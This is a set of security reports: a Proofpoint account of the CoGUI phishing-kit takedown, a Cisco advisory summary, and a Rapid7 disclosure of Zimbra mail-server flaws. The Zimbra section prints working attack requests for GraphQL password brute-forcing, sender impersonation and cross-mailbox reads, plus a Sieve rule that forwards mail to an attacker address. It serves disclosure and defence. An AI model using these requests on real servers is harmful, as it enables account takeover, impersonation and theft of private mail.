collaboration with private and public partners including Proofpoint, Microsoft, Japan Cybercrime Control Center (JC3), Resecurity, Cloudflare, Oracle, and TRM Labs. Microsoft and co-plaintiff Health-ISAC also filed a lawsuit against the YAM Store threat actors and individuals linked to the phishing operations. Microsoft and Health-ISAC seized and redirected domains enabling YAM Store, CoGUI and Iron Man fraud. The disruption and associated civil filing in the U.S. District Court for the Southern District of Florida is likely to have a significant impact on CoGUI operations and overall threat activity. Proofpoint supported Microsoft's action with threat data from our visibility, including malicious domains and information related to CoGUI, CoAceV and CoFish_ws campaigns, and provided a declaration for the suit. In addition to the disruption, the following splash page was displayed on the seized domains: Figure 1: Splash page shown to visitors of malicious sites. The takedown targeting threat actors responsible for hundreds of millions of malicious messages attempting financial fraud will likely have a measurable impact on the Chinese phishing ecosystem and cause significant operational friction among multiple threat groups. Background Towards the end of 2024, Proofpoint researchers identified an emerging cluster of phishing activity consistently targeting Japan with very high volumes of email campaigns. We then released public details on a phishing kit that Proofpoint researchers referred to as “CoGUI”, highlighting how the phishing kit impersonated well-known Japanese or international companies in order to steal usernames, passwords, and payment data such as credit card information. In the days following our publication, the phishing kit developer introduced what appeared to be a joke in the kit as a response to our report, as we saw a new pattern “coguicogui” appear in the network communications. Since then, this highly evasive kit has made Japan one of the most targeted countries in Proofpoint data based on campaign volumes. We detect and block over 100 million email messages per month targeting organizations using the CoGUI phishing kit to steal usernames, passwords, and payment data. More than one year later, the CoGUI phishing kit is still regularly used by cybercriminals, according to Proofpoint data. Yet two other phishing kits have also appeared, closely related to CoGUI, expanding the ecosystem of Chinese-language phishing kits. We named those kits CoAceV and CoFish_Ws and assess with high confidence these three kits are all related. They are part of the broader ecosystem. According to Microsoft’s data, YAM Store, CoGUI and Iron Man have enabled more than one billion malicious messages targeting over 75,000 organizations worldwide, since January 2026. Campaign Details In total, Proofpoint has observed 66 different brands being impersonated by those phishing kits, most of these brands being Japanese. Examples of impersonated brands include Amazon, PayPay, MyJCB, Apple, Orico, Rakuten, SMBC, Saison Card, Aeon Card, UC Card, Matsui Securities, DHL, Yamato Transport. Phishing kit Name Number of campaigns Number of unique domains used CoGUI 1081 13586 CoAceV 242 2812 CoFish_Ws 19 191 Table 1: Phishing kits statistics Overall, we have observed around 17,000 unique domains used by these three phishing kits since we began tracking their use. The groups create and rotate domains frequently; between 01 July and 17 September 2026, for example, we observed 3,788 unique fully qualified domain names (FQDNs) being used by the three phishing kits. This indicates a dynamic operation that has the capabilities and resources to purchase and manage phishing infrastructure at scale. Email lures vary and can relate to financial and banking information, credit card or payment account details, consumer retail information, or shipping and transportation, among other themes. Messages contain URLs that lead, after a variety of filtering including CAPTCHA, to landing pages that masquerade as login or payment portals for the impersonated companies. Figure 2: Anonymized CoFish_ws e-mail impersonating JACCS. Figure 3: CAPTCHA used in a CoFish_ws campaign. Figure 4: CoFish_ws phishing page impersonating JACCS and requesting credentials. Figure 5: CoFish_ws phishing page impersonating JACCS and requesting credit card information. Phishing kit overlaps Over time we have found overlaps between the different phishing kits, including characteristics of targeting, decoy landing pages, URL structure, and more. For example, in February 2026, we saw a new decoy method on the CoGUI phishing kit. When browsing conditions were not met, the phishing kit would decoy the browser to www.a.com, or www.b.com, or www.c.com. (A decoy is used by the threat actor to direct traffic to a different website than the phishing kit to avoid detection by automated sandboxing.) A few days after CoGUI began using this method, we observed the CoAceV phishing kit employ the exact same decoy method in campaigns. As an example, two Apple phishing campaigns, one using CoGUI, one using CoAceV, appeared during the same period of time from 13 to 17 April 2026 using the same decoy page. Additionally, we have also observed overlap in URL patterns and paths. In these cases, the unique domains are operated by one phishing kit, but both share the same or similar URL paths. CoGUI: hxxps://kenandy[.]shop/paidy/ubmisionsjp/ CoAceV: hxxps://paidy[.]farradae.com/paidy/ubmissionsjp CoGUI: /MoldWnfEpQOjMnhOpLnumth/help CoAceV: /SmbdWnfEp7OjMnhEVdyubtCl/help One URL pattern has been used by the three kits: CoGUI: hxxps://lygyaou[.]com/9AioLNhtdi.kumamoto-city[.]jp CoAceV: hxxps://ylhgkj[.]com/BCuXkTPfKZ.kumamoto-city[.]jp CoFish_ws: hxxps://new-app-haixing[.]com/1DWSd1DeDf.kumamoto-city[.]jp Impact The vast majority of tracked CoGUI/CoAceV/CoFish_Ws campaigns impact Japan, with a few impacting the United States of America, Australia, and Italy. According to our email threat data, the most frequently impacted business sectors are Financial Services and Healthcare, with Government, Education, and Manufacturing rounding out the top five impacted sectors. The threat actors seem particularly interested in gaining access to financial services. In 2025, Japanese authorities published details about an increase in phishing activity targeting financial organizations. The goal of the threat actors was reportedly to gain access to victims' accounts for financial gain, and in most cases, using illicit gains to buy Chinese stocks. Based on the observed activity and third-party reporting, it is possible this activity was linked to CoGUI credential phishing threat actors. This aligns with the group’s financial theft objective and fraud campaigns. Disruption Successful account takeovers can cause significant harm to compromised organizations including financial and reputational damage. CoGUI and related kits are high volume, and consistently some of the most active threats in Proofpoint data. With this disruption that targeted the broader ecosystem including YAM Store and Iron Man, we hope this changes. Proofpoint’s mission is to provide the best human-centric protection for our customers against advanced threats. Whenever it is possible and appropriate to do so, and as is the case with the CoGUI disruption, Proofpoint uses its team’s knowledge and skills to help protect a wider audience against widespread malware and phishing threats. summary:
A vulnerability in the Advanced Malware Protection (AMP) feature of Cisco Secure Email Gateway could allow an unauthenticated, remote attacker to write arbitrary files on the underlying operating system. This vulnerability is due to improper handling of email attachments when the file reputation service is enabled. An attacker could exploit this vulnerability by sending an email that contains a crafted attachment through an affected device. A successful exploit could allow the attacker to write arbitrary files and execute commands with root privileges on the underlying operating system. Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability. This advisory is available at the following link: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-esa-afw-zqYJkjxp For further documentation of improvements and fixes in Cisco Secure Email Gateway, see Cisco Secure Email Gateway and Secure Email and Web Manager Security Hardening Release: September 2026 .
Security Impact Rating: Critical
CVE: CVE-2026-76519

summary: An enterprise mail server authenticates users, stores private communications, delivers recovery links, runs calendars, and sends mail that employees and other systems trust. Compromising it can therefore expose both email and the identities and workflows built around it. During a broader assessment of Zimbra Collaboration Suite (ZCS), Rapid7 reported more than 80 vulnerabilities spanning authentication, mailbox authorization, calendar processing, web clients, document services, and the host operating system. The affected components are being fixed on different schedules, so we are publishing the analysis in stages. An accompanying GitHub repository containing full write-ups and PoCs serves as a live technical tracker, and will be updated as further findings and fixes become public. This first article concentrates on five account-related vulnerabilities: CVE Finding Rapid7 CVSS Fixed release CVE-2026-93637 GraphQL authentication rate-limit bypass 3.7 Low No public fix listed CVE-2026-93635 LDAP filter injection 5.3 Medium No public fix listed CVE-2026-73571 Email impersonation via SaveDraftRequest 8.3 High ZCS 10.1.17 CVE-2026-10631 EWS cross-user mailbox access 6.5 Medium ZCS 10.1.20 CVE-2026-50055 Sieve notify forwarding-restriction bypass 6.5 Medium ZCS 10.1.20 Part 2 will cover unauthenticated stored XSS paths in the Classic and Modern clients and what they can do with the recipient's session. A script can install the Sieve forwarding rule (CVE-2026-50055); another path preserves direct mailbox access after the original session expires or the victim changes their password. CVE-2026-73571 makes these attacks more credible by placing the message in the mailbox as any chosen local user. Parts 3 and 4 move through the document-service boundary from SSRF to code execution as zimbra , then cover multiple independent paths from zimbra to root. The BruCON presentation, Signed, Sealed, Compromised: Weaponizing Enterprise Mail Infrastructure , previewed these chains, including selected root-command output returned to the victim's browser after one message selection. Product description Zimbra Collaboration Suite is a self-hosted platform for email, calendars, contacts, tasks, and file sharing. Zimbra calls its commercial server Network Edition. Within one Network Edition installation, customers can license a mixture of Standard and Professional users. Zimbra Desktop and Zimbra Connector for Outlook are separate client applications, while Exchange Web Services (EWS) is a separately licensed server feature for Outlook compatibility. ZCS includes two webmail clients with different request and rendering stacks: Classic relies primarily on SOAP, while Modern uses GraphQL. The server also accepts SMTP and iCalendar input, exposes compatibility services such as EWS, and delegates work to local components running under several operating-system identities. Testing setup Rapid7 initially assessed ZCS 10.1.16_GA_4850 Network Edition on Ubuntu 22.04. For fixed findings, each section describes Zimbra's fix and the accompanying Github repository retains the complete vulnerable-to-fixed diff. Impact The pre-authentication findings lower separate barriers to obtaining a foothold. GraphQL hides failed password attempts from Zimbra's source-IP counter. In the configured external-LDAP case, a second flaw can also leave the optional account-lockout policy with no local account to lock. Each remaining finding is independently exploitable from an ordinary compromised account. Email impersonation needs no optional feature: the attacker places a different local address in an authenticated request. Zimbra submits the message from that account through the trusted outbound pipeline and records a copy in the selected user's Sent folder. If EWS is enabled for the compromised account, the attacker can read private conversations, attachments, drafts, sent mail, contacts and calendar entries from other users' mailboxes. A separate Sieve policy bypass can keep copies of future mail flowing to the attacker after the original session expires or the password changes. These examples do not represent everything an attacker can do with authenticated Zimbra access, or the full vulnerability set from the assessment. GraphQL authentication rate-limit bypass (CVE-2026-93637) This pre-authentication route requires only HTTPS access to Zimbra. ZimbraInvalidLoginFilter normally records failed logins by source address around requests to the public service endpoints. Classic submits login attempts through the SOAP AuthRequest path, whereas Modern exposes the same password check through its GraphQL authenticate mutation. That limiter's failure threshold is 10 by default, and after a source crosses it within the configured window, subsequent requests handled by the filter receive HTTP 503. CVE-2026-93637 allows attempts through GraphQL to remain invisible to that counter. Technical analysis The failure counter relies on a request attribute ZimbraInvalidLoginFilter wraps requests to the public service endpoints and runs the downstream handler before its counter logic: // ZimbraInvalidLoginFilter.doFilter() // ... whitelist, disabled-filter and existing-suspension handling omitted chain.doFilter(request, response); if (req.getAttribute(AUTH_FAILED) != null) { // [0] wrapper-supplied signal // ... logging omitted boolean loginFailed = (Boolean)req.getAttribute(AUTH_FAILED); if (loginFailed) { // ... per-IP counter lookup and initialization omitted if (count.incrementAndGet() > this.maxFailedLogin) { this.numberOfFailedOccurence.put(clientIp, count); this.suspiciousIpAddrLastAttempt.put( clientIp, System.currentTimeMillis()); } this.numberOfFailedOccurence.put(clientIp, count); } // ... final debug logging omitted } At [0] , failure processing begins only if the downstream path added auth.failed to the request. The relevant SOAP exception path is: // SoapEngine.dispatchRequest() // ... earlier dispatch handling omitted catch (AccountServiceException.AuthFailedServiceException e) { HttpServletRequest httpReq = (HttpServletRequest)context.get("servlet.request"); httpReq.setAttribute("auth.failed", (Object)Boolean.TRUE); // [1] failure becomes visible String clientIp = (String)context.get(REQUEST_IP); httpReq.setAttribute(REQUEST_IP, (Object)clientIp); response = soapProto.soapFault((ServiceException)e); // ... debug and informational logging omitted } At [1] , SoapEngine.dispatchRequest() sets the attribute before returning the authentication fault. A failed SOAP login therefore reaches the check at [0] and increments the source-IP counter. GraphQL skips the SOAP failure handler Modern Zimbra's GraphQL extension builds an ordinary AuthRequest , then reaches its handler through XMLDocumentUtilities.executeDocumentAsGuest() : // XMLDocumentUtilities.executeDocumentAsGuest() public static Element executeDocumentAsGuest(DocumentHandler handler, Element request, RequestContext rctxt) throws ServiceException { HashMap<String, Object> context = new HashMap<String, Object>(); context.put("zimbra.context", GQLAuthUtilities.getGuestZimbraSoapContext(request.getQName(), handler, rctxt)); context.put("servlet.request", rctxt.getRawRequest()); context.put("servlet.response", rctxt.getRawResponse()); return handler.handle(request, context); // [2] bypasses SoapEngine } At [2] , the helper calls the authentication handler without passing through SoapEngine . An incorrect password still becomes a GraphQL error, but the catch block at [1] never runs. The attribute read at [0] is absent, so the filter does not increment the source-IP counter. Exploitation Batched authentication An unauthenticated client sends JSON to /service/extension/graphql . GraphQL aliases let its query field invoke authenticate repeatedly with different passwords: mutation { a0: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass0"}) { authToken } a1: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass1"}) { authToken } a2: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass2"}) { authToken } } Each alias performs a real authentication operation. Failures appear in the GraphQL errors array, while a successful alias returns an authentication token under its corresponding name. The GraphQL engine imposes no application-level alias limit on this path. The whole document remains one HTTP request, so Jetty's request-count control sees one request rather than the number of login operations inside it. Alias execution is sequential and backend-bound, so the rate depends on the deployment. Using 100 aliases per request, 10,000 candidates completed in under two minutes without the Zimbra IP counter or Jetty's request filter blocking the source. The vulnerability removes IP-level failed-login accounting and reduces request overhead. The CVE-2026-93637 PoC accepts an ordinary password file, generates the batched GraphQL documents and reports the accepted candidate. Figure 1: Metasploit module tests 1500 passwords in 15 requests, successfully identifying the correct password in the final batch. Per-account lockout The IP counter is not Zimbra's only possible control. Its separate per-account lockout policy is disabled by default, but when enabled, failed GraphQL operations still increment the target local account's counter and stop further guessing when that account locks. CVE-2026-93635 and external LDAP On domains configured with external LDAP search-filter authentication and lazy auto-provisioning, CVE-2026-93635 turns the login field into a password oracle for an external directory user. LdapUtil.computeDn() substitutes a wildcarded login such as jdoe*@example.test into the configured filter without escaping it. If that pattern selects one directory entry, Zimbra tries the candidate password against that user. An incorrect password returns account.AUTH_FAILED ; a correct password passes the LDAP bind and reaches lazy provisioning, producing a different response. The wildcarded login is not the name of an existing local Zimbra account, so the optional per-account lockout has no account against which to record the failed attempt. Sending the same operation through GraphQL also avoids the source-IP counter. With per-account lockout enabled and its threshold set to five, repeated wrong candidates incremented neither counter, while a correct password remained distinguishable. This two-bug composition applies only to the stated external-LDAP configuration, not Zimbra's default local-authentication path. The LDAP/GraphQL composition PoC and CVE-2026-93635 tracker entry cover this configured external-directory path in detail. The CVE-2026-93637 tracker entry records the standalone finding and affected-version evidence. Impact Anyone who can reach the public GraphQL endpoint can make repeated password guesses without triggering Zimbra's source-IP suspension. Batching several candidates also reduces the number of HTTP requests and the associated network overhead. This makes weak, reused or previously exposed passwords more practical to test, but it does not reveal a strong password or bypass a separate MFA check. Email impersonation via SaveDraftRequest (CVE-2026-73571) SaveDraftRequest has a delegated-sending path selected by isDelegatedReq . On a vulnerable server, an ordinary user can place another local address in the request's From field. The handler resolves that address to its mailbox, assumes the mailbox owner's authority and calls Zimbra's normal send routine without checking whether the signed-in account has send-as rights. This is an application authorization failure, not a forged display name or a hand-written SMTP header: Zimbra submits the attacker's message as the selected account and adds the corresponding item to that account's Sent folder. The target must be on the same mailbox server, but the attack requires no optional Zimbra feature, existing delegation, administrator right or victim action. Technical Analysis Claimed sender becomes mailbox authority After the request parser extracts the From address, the delegated branch resolves that address to a local account and reads an optional delegateeAccountId : // SaveDraft.handle() excerpt // ... message fields, From address and delegation attributes parsed above if (mailAddress != null) { delegatorAccount = prov.get( Key.AccountBy.name, mailAddress, zsc.getAuthToken()); // [0] account named by From } if (isDelegatedReq) { delegatorMbox = MailboxManager.getInstance() .getMailboxByAccountId(delegatorAccount.getId()); Account delegateeAccount = null; OperationContext oct = null; if (delegateeAccountId != null) { delegateeAccount = prov.getAccountById(delegateeAccountId); oct = new OperationContext(delegateeAccount); // [1] supplied account context } else if (delegatorMbox != null) { oct = new OperationContext(delegatorMbox); // [2] claimed sender context } if (oct != null && delegatorMbox != null) { mm = ParseMimeMessage.parseMimeMsgSoap( zsc, oct, delegatorMbox, msgElem, null, mimeData); boolean deliveryReport = false; // ... optional delivery-report update omitted SendMsg.doSendMessage(oct, delegatorMbox, mm, mimeData.uploads, null, "r", null, null, false, false, false, deliveryReport); // [3] platform delivery } // ... response construction omitted } There is no checkRight() , canAccessAccount() , or canSendAs() call between resolving the account at [0] and delivery at [3] . In the demonstrated request, delegateeAccountId is absent. At [2] , Zimbra constructs the operation context from the mailbox named in From , causing the later send to treat the selected account as the caller. [3] then submits the message through Zimbra's legitimate sending path. There is a second way to trigger the flaw. The attacker can supply the claimed sender's account UUID in delegateeAccountId . At [1] , Zimbra constructs the operation context directly from that account and reaches the same impersonation result without checking the identity that was actually signed in. Exploitation Sending as a local identity The relevant SaveDraftRequest body is: <SaveDraftRequest xmlns="urn:zimbraMail" isDelegatedReq="1"> <m> <e t="t" a="recipient@example.test"/> <e t="f" a="ceo@example.test"/> <su>Updated payroll review</su> <mp ct="text/plain"><content>Please review the changes.</content></mp> </m> </SaveDraftRequest> Because Zimbra submits the message through its legitimate infrastructure, the issue goes beyond display-name spoofing. On a deployment whose legitimate outbound mail passes SPF, DKIM, and DMARC, the impersonated message passes them too: it uses the same source MTA, signing domain, RFC sender, and envelope sender as legitimate mail from the selected account. Local testing confirmed that sender alignment and normal MTA path. The CVE-2026-73571 PoC submits the delegated request with an operator-selected sender, recipient, subject and message body. On the affected build, the message arrived with the CEO as its RFC sender, and the same subject appeared in the CEO's Sent folder. Figure 2: The victim's Inbox displays the forged message as an ordinary internal email from the CEO. Impact An attacker can impersonate any local user, not only an administrator or executive. Internally, that allows believable payment requests, changes to account details, malicious links, false instructions and fraudulent approvals. Normal display-name spoofing warnings and external-sender banners do not help because Zimbra submits the message as the selected local user. Zimbra also places the forged message in the impersonated user's Sent folder. This leaves a fabricated record of authorship and can support an attempt to frame that user. Figure 3: The same forged message is recorded in the CEO's Sent folder. For external recipients, the attacker can send from a finance account to request new payment details, use an operations account to cancel or alter an order, or send scams and abusive mail under an employee's address. The consequences depend on the role and relationships of the selected sender. The same trusted-delivery advantage applies to exploit-bearing mail. The next article will examine browser-side findings that an attacker can deliver from any chosen local account. Impersonation is not required for the XSS itself, but can make the message appear to come from somebody the recipient trusts. Fix The patch in ZCS 10.1.17 retains the account that actually signed in unless it has an explicit send-as or send-on-behalf-of right. An unauthorized delegated request consequently runs as the caller rather than the account named in the message. EWS cross-user mailbox access (CVE-2026-10631) Zimbra's EWS extension uses composite folder IDs intended for shared-mailbox operations. FindItem trusts the owner UUID inside an attacker-supplied ID and constructs the authorization context from the selected mailbox instead of the account that signed in. This Insecure Direct Object Reference (IDOR) lets any ordinary EWS-enabled account read complete items from other users' mailboxes without a share or delegation grant. The attacker needs zimbraFeatureEwsEnabled=TRUE . Although disabled by default, deployments using Zimbra's Outlook desktop integration commonly enable EWS class-of-service-wide. The target account does not need EWS enabled, and no target-user action is required. Technical analysis Composite IDs select the mailbox To address a shared item, EWS needs to identify both the mailbox that owns it and the item or folder inside that mailbox. Zimbra encodes this as {ownerUUID}_{numericId} . For example: 5e05e6e2-8810-4c2a-a7ac-3771df62e344 _2 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^ owner UUID +-- folder 2 (Inbox) When FindItem receives a composite ID, FolderUtil.parseItemId() separates the owner and numeric portions. The owner value is then passed to ItemUtil.getGrantorMailbox() : // ItemUtil.getGrantorMailbox() public static Mailbox getGrantorMailbox(String ownerId) throws ServiceException { Provisioning prov = Provisioning.getInstance(); Account ownerAcct = prov.get(Key.AccountBy.id, ownerId); // [0] supplied owner UUID Mailbox mailboxOwnr = MailboxManager.getInstance() .getMailboxByAccount(ownerAcct); // [1] selected mailbox return mailboxOwnr; } At [0] , EWS resolves the supplied owner UUID to a local account; [1] retrieves that account's mailbox. Neither method receives the caller's identity. The mailbox becomes the authenticated identity The authenticated account and selected mailbox are then passed to ItemOperation : // ItemOperation.ItemOperation() public ItemOperation(Account account, Mailbox mailbox, ZimbraAuth zimbraAuth) throws ServiceException { this.account = account; // [2] authenticated attacker this.mailbox = mailbox; // [3] selected owner's mailbox this.octxt = mailbox == null ? new OperationContext(account) : new OperationContext(mailbox); // [4] selected owner context this.zimbraAuth = zimbraAuth; this.octxt.setUserAgent(zimbraAuth.getUserAgent()); } [2] is the attacker account. Supplying a victim UUID makes [3] the victim mailbox, so it is not null. [4] therefore creates OperationContext from the victim mailbox instead of the attacker account. // OperationContext constructors public OperationContext(Mailbox mbox) throws ServiceException { this(mbox.getAccount()); // [5] target mailbox owner } public OperationContext(Account acct) { this(acct, false); } public OperationContext(Account acct, boolean admin) { this.authuser = acct; // [6] identity used for permission checks // ... remaining context initialization omitted } [5] extracts the victim account from that mailbox, and [6] stores the victim as the authenticated user. The mailbox then compares this identity with its owner: // Mailbox.getAuthenticatedAccount() Account getAuthenticatedAccount() { // ... context and authenticated-user lookup omitted if (authuser != null && authuser.getId().equals(this.getAccountId())) { authuser = null; // [7] matching identity is treated as owner access } return authuser; } The identities match, so [7] changes the authenticated user to null, which downstream checks treat as owner access. The attacker's request is consequently authorized as the victim. EWS has used the untrusted owner UUID both to select a mailbox and to decide who is authenticated. The numeric folder ID is subsequently resolved within that owner context, allowing FindItem to access any folder in the selected mailbox. Exploitation Resolving a target mailbox A target UUID is available through ordinary authenticated directory lookups. Both GetAccountInfoRequest and SearchGalRequest return zimbraId for a known local address. The PoC uses GetAccountInfoRequest : <GetAccountInfoRequest xmlns="urn:zimbraAccount"> <account by="name">victim@example.test</account> </GetAccountInfoRequest> The response contains the target's UUID: <attr name="zimbraId"> 5e05e6e2-8810-4c2a-a7ac-3771df62e344 </attr> Appending _2 to the UUID forms the target's Inbox identifier. The attacker sends the following EWS request to /service/extension/zimbraews , or to /EWS/Exchange.asmx when EWS is exposed through Zimbra's standard proxy: <m:FindItem Traversal="Shallow" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"> <m:ItemShape> <t:BaseShape>AllProperties</t:BaseShape> <t:IncludeMimeContent>true</t:IncludeMimeContent> </m:ItemShape> <m:IndexedPageItemView MaxEntriesReturned="5" Offset="0" BasePoint="End"/> <m:ParentFolderIds> <t:FolderId Id="5e05e6e2-8810-4c2a-a7ac-3771df62e344_2"/> </m:ParentFolderIds> </m:FindItem> The server returns the selected mailbox's data in the EWS response: <ns2:Message xmlns:ns2="http://schemas.microsoft.com/exchange/services/2006/types"> <!-- Complete base64 MIME and other returned fields omitted. --> <ns2:ItemId Id="5e05e6e2-8810-4c2a-a7ac-3771df62e344_380" ChangeKey="600"/> <ns2:Subject>Project Phoenix acquisition timeline</ns2:Subject> <ns2:Body BodyType="Text">The target accepted the preliminary terms. Board approval is due Friday. Keep this strictly confidential.</ns2:Body> <ns2:HasAttachments>true</ns2:HasAttachments> <ns2:From><ns2:Mailbox> <ns2:EmailAddress>finance@northbridge.example</ns2:EmailAddress> </ns2:Mailbox></ns2:From> <ns2:InternetMessageId><20261005150023.563F6400B9@mail.lab.local></ns2:InternetMessageId> </ns2:Message> The CVE-2026-10631 PoC obtains that UUID and creates the composite ID automatically. Cross-account folder reads Changing the numeric component selects another well-known folder: Folder Crafted ID Unauthorized result Inbox {uuid}_2 Received messages and attachments Sent {uuid}_5 Messages sent by the target Drafts {uuid}_6 Unfinished messages Contacts {uuid}_7 Address-book entries Calendar {uuid}_10 Appointments and meeting data If the target mailbox is on another server in the same Zimbra cluster, the first server forwards the crafted request. The receiving server resolves its local mailbox from the same owner UUID and reaches the vulnerable FindItem constructor. The CVE-2026-10631 tracker entry covers the full response, affected folders and multi-server path in detail. Impact EWS exposes the victim's private message bodies and attachments, as well as drafts, sent mail, contacts and calendar data. The attacker can monitor conversations and use their history to make the separate impersonation attack more credible. An attacker can also request a password reset for another service, monitor the corresponding mailbox and consume the link. EWS does not bypass third-party MFA by itself, but it exposes an email channel that many services still treat as sufficient proof. Because the owner UUID is attacker-selected, the same ordinary EWS account can repeat these reads against other local mailboxes. Note that an earlier version of this analysis, presented at BruCON 2026 , attributed GetItem , send, move and delete to the same flaw. Comparing intermediate Network Edition releases during this research required multiple restored VM appliances, because EWS is license-gated and normal patching advances the complete system; one appliance retained a separate mailbox authorization state that obscured the boundary, which initially made the impact appear broader . Repeating each operation with explicit authorization and target-state controls narrowed the CVE to FindItem , which still exposes complete MIME and attachments. Fix The patch in ZCS 10.1.20 creates the EWS authorization context from the account that signed in, not the mailbox selected by the composite ID. Zimbra applied that correction to both local and remote mailbox operations. Sieve notify forwarding-restriction bypass (CVE-2026-50055) zimbraFeatureMailForwardingInFiltersEnabled=FALSE is meant to stop users creating server-side mail-forwarding rules. Zimbra enforces it by rejecting Sieve redirect , but accepts notify even though that action can send selected headers and the complete text body to an arbitrary external address. An authenticated user can therefore install persistent mail exfiltration despite the administrator's restriction. If forwarding is normally allowed, there is no policy boundary to bypass. Technical analysis Redirect is the only blocked action Both the ModifyFilterRulesRequest and ModifyOutgoingFilterRulesRequest SOAP commands call checkForwardFilterAttr() before saving a rule. The check recognizes only one action type: // DocumentHandler.checkForwardFilterAttr() public boolean checkForwardFilterAttr(Account account, List<FilterRule> filterRules, String filterRuleType) throws ServiceException { if (!account.isFeatureMailForwardingInFiltersEnabled() && !filterRules.isEmpty()) { for (FilterRule filterRule : filterRules) { if (!Objects.requireNonNull(filterRule.getFilterActions()).stream() .anyMatch(FilterAction.RedirectAction.class::isInstance) // [0] redirect only || this.checkIfFilterAlreadyExists(filterRule, account, filterRuleType)) continue; return false; } } return true; // [1] all other actions allowed } At [0] , the policy classifies only RedirectAction as forwarding, meaning NotifyAction and RFCCompliantNotifyAction reach [1] even though they can send attacker-selected message content to an external email address. Notify expands message content These actions can include message content rather than just a generic alert because SoapToSieve.getSieveScript() enables the variables and enotify extensions. FilterUtil.getVarsMap() then supplies the values available to the notification: // FilterUtil.getVarsMap() excerpt // ... case-insensitive variable-map construction omitted Enumeration enumeration = mimeMessage.getAllHeaders(); while (enumeration.hasMoreElements()) { Header header = (Header)enumeration.nextElement(); vars.put(header.getName().toLowerCase(), ZInternetHeader.decode( mimeMessage.getHeader(header.getName(), ","))); // [2] decoded headers } vars.put("subject", parsedMessage.getSubject()); MPartInfo bodyPart = Mime.getTextBody(parsedMessage.getMessageParts(), false); if (bodyPart != null) { // ... IOException handling omitted vars.put("body", Mime.getStringContent( bodyPart.getMimePart(), mailbox.getAccount().getPrefMailDefaultCharset())); // [3] selected text body } return vars; When the rule runs, Notify.executeBasic() expands those variables into the notification subject and body. [2] makes decoded headers available, and [3] supplies the text part selected by Mime.getTextBody() . It does not supply raw MIME or attachments. Exploitation Installing persistent exfiltration An authenticated user can place the following rule object inside ModifyFilterRulesRequest : <filterRule name="Email Notification" active="1"> <filterTests condition="allof"><trueTest/></filterTests> <filterActions> <actionNotify a="attacker@external.example" su="Fwd: ${subject}" content="From: ${from} To: ${to} Subject: ${subject} ${body}"/> <actionKeep/> </filterActions> </filterRule> actionKeep leaves the original message in the user's Inbox, while each matching delivery sends the selected message text and headers to the external address. The CVE-2026-50055 PoC preserves existing filters while installing the notify rule. After an ordinary message arrived for the filtered account, another mailbox received its subject, sender, recipients, date and complete text body. The CVE-2026-50055 tracker entry has the complete affected-version information. Figure 4: The notification delivered to the attacker contains the subject, headers and complete text body of the victim's message. Hidden from Modern The persistence is not apparent in Modern. During testing, the server returned the active notification rule while the same account's Filters view remained empty. The server continued to run the rule normally, but Modern did not give the account owner a way to discover or remove it. Figure 5: Modern's Filters view does not display the active Sieve notify rule. Classic did list the attacker-selected name under Active Filters, but its overview did not expose the notification address or copied fields. The rule is therefore not invisible from every client, and an attacker can choose a less conspicuous name. Figure 6: Classic displays the attacker's rule name but not the external destination or copied fields. Impact The flaw defeats an administrator's attempt to prevent users from forwarding mail with server-side filters. An attacker with an authenticated session can install the rule directly. It continues to disclose future message text and headers after that session expires or the password changes, without appearing in Modern's Filters view. It does not forward attachments or raw MIME. Fix The patch in ZCS 10.1.20 treats notify and its RFC-compliant variant as forwarding actions and rejects them under the same account policy as redirect . Remediation Apply the latest supported Zimbra release. Zimbra's security advisory lists CVE-2026-73571 as fixed in ZCS 10.1.17 and CVE-2026-10631 and CVE-2026-50055 as fixed in ZCS 10.1.20. No fixed release is publicly listed for CVE-2026-93635 or CVE-2026-93637 at the time of publication, so install the security update containing those fixes when Zimbra releases it. Upgrading does not remove filter rules already saved to accounts. Administrators should inspect the stored incoming and outgoing filter rules for external actionNotify and RFC-compliant notify actions that violate forwarding policy; Modern's Filters view is not sufficient for this review. Detection and Incident Response A reverse proxy or web application firewall that inspects request bodies can detect multiple authenticate aliases in one anonymous GraphQL request. Zimbra's EWS logs expose cross-user operations involving two different account UUIDs, as shown in the EWS IoCs . Saved notify rules and outbound notification traffic provide more direct evidence of the Sieve path. EWS creates no delegation grant to revoke, Sieve rules remain as saved account state, and sender impersonation can generate ordinary Sent and MTA artifacts. Recovery must cover those server-side changes and any other mailbox reached, not only the password of the account first compromised. Credit The assessment was conducted by Jonah Burgess ( CryptoCat ), Senior Security Researcher at Rapid7, in accordance with Rapid7's vulnerability disclosure policy . Disclosure timeline April 17, 2026: Rapid7 submitted an initial report covering 23 findings. April 24, 2026: Zimbra acknowledged the report. May 21, 2026: Zimbra confirmed they validated 10 of the 23 findings, three of which were duplicates. May 28, 2026: ZCS 10.1.17 fixed CVE-2026-73571. June 1, 2026: Zimbra requested an embargo on publication until the planned ZCS 10.1.18 release in September. June 16 and July 7, 2026: ZCS 10.1.18 and 10.1.19 were released without additional fixes from the initial report. July 15, 2026: Zimbra and Rapid7 agreed on September 24 as the coordinated disclosure date. July 20, 2026: ZCS 10.1.20 fixed three additional CVE-assigned findings from the initial report: CVE-2026-50054, CVE-2026-10631 and CVE-2026-50055. August 19, 2026: Rapid7 submitted a second report containing 32 additional findings. August 31, 2026: Rapid7 and Zimbra met to prioritize remediation and discuss patch verification. September 8, 2026: Rapid7 submitted a third report containing 25 lower-priority findings. September 17–18, 2026: Zimbra requested 90 days from receipt of the later report before publication of full technical details. Rapid7 scheduled those later findings for November 23. September 24, 2026: ZCS 10.1.21 fixed four findings from the second report. Rapid7 presented selected results and attack chains at BruCON without releasing the associated weaponized PoCs.
